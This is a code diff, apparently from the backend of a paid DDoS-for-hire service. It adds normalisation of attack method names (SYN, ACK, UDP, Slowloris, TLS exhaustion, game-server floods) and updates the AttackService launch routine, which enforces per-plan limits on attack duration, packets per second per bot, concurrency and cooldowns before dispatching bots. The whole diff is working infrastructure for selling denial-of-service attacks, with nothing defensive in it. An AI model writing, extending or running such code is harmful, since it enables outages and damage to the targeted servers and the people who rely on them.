@@ -65,10 +65,40 @@ async def fetch_free_proxies(limit=500):
     print(f"[proxy] Fetched {len(proxies)} proxies, sending {min(len(proxies), limit)}")
     return result
 
+def _normalize_method(m: str) -> str:
+    """Map legacy / alias method names to current bot methods."""
+    u = (m or "PSPE").upper().strip()
+    if u in ("MEGA", "PORT", "SCAN", "UDP"):
+        return "PSPE"
+    if u in ("TLS_EXHAUST", "SSL"):
+        return "TLS"
+    if u in ("SLOWLORIS", "SLOW", "HTTPS", "HTTP_PROXY", "PROXY", "WEB"):
+        return "HTTP"
+    if u in ("MYSQL", "SQL", "MARIADB", "MYSQLD", "SYN", "SYNFLOOD", "ACK"):
+        return "TCP"
+    if u in ("NRO",):
+        return "GAME"
+    if u in ("PSPE", "TCP", "TLS", "HTTP", "GAME"):
+        return u
+    return u
+
+
+def _normalize_plan_methods(raw) -> list:
+    out = []
+    for m in (raw or []):
+        n = _normalize_method(m)
+        if n in ("PSPE", "TCP", "TLS", "HTTP", "GAME") and n not in out:
+            out.append(n)
+    return out or ["PSPE", "TCP", "TLS", "HTTP", "GAME"]
+
+
 class AttackService:
     @staticmethod
     async def launch(user: User, data: AttackCreate) -> AttackTask:
         is_admin = (user.role or "") == "admin"
+        # Normalize method early so plan/bot checks use current names
+        data.method = _normalize_method(data.method)
+
         async with async_session() as s:
             plan = None
             max_concurrent = 10
@@ -96,7 +126,7 @@ class AttackService:
                 max_concurrent = plan.max_concurrent
                 max_secs = plan.max_attack_secs
                 max_pps = plan.max_pps_per_bot
-                allowed = list(plan.allowed_methods or [])
+                allowed = _normalize_plan_methods(plan.allowed_methods)
                 cooldown = plan.cooldown_secs or 0
 
                 if data.duration_secs > max_secs:
@@ -104,7 +134,10 @@ class AttackService:
                 if data.pps_per_bot > max_pps:
                     raise HTTPException(400, f"PPS exceeds plan limit ({max_pps})")
                 if allowed and data.method not in allowed:
-                    raise HTTPException(400, f"Method '{data.method}' not allowed in plan")
+                    raise HTTPException(
+                        400,
+                        f"Method '{data.method}' not allowed. Plan allows: {', '.join(allowed)}",
+                    )
 
                 recent = (await s.execute(
                     select(AttackTask).where(AttackTask.user_id == user.id)
